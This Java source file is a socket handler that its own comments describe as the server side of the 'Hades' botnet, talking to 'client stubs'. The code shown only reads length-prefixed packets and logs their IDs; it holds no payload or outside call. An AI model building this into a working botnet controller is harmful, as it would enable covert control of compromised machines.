package net.hadesbot.server.socket;

import net.hadesbot.server.Server;
import net.hadesbot.server.utils.PacketSerializer;

import java.io.DataInputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

/**
 * The SocketServer class represents the server-side socket operations of the botnet system.
 * It handles incoming connections and manages communication with the client stubs.
 *
 * @author Hades Development
 * @project Hades
 * @date 5/27/2023
 */

public class SocketServer extends Thread{

    public final Server server;
    public final Socket socket;

    public SocketServer(Server server, Socket socket) {
        this.server = server;
        this.socket = socket;
    }

    @Override
    public void run() {
        System.out.println("Connection from " + socket.getInetAddress());
        /* Manage received packets */
        try{
            DataInputStream input = new DataInputStream(socket.getInputStream());
            byte[] sizeArray = new byte[4];
            while(true){
                for(int i = 0; i < 4; i++){
                    sizeArray[i] = input.readByte();
                }
                int size = ByteBuffer.wrap(sizeArray).getInt();
                byte[] packetData = new byte[size];
                for(int i = 0; i < size; i++){
                    packetData[i] = input.readByte();
                }
                PacketSerializer data = new PacketSerializer(packetData);
                int packetID = data.readShort();
                System.out.println("Received packet (id: " + packetID + "; size: " + size + ")");

            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
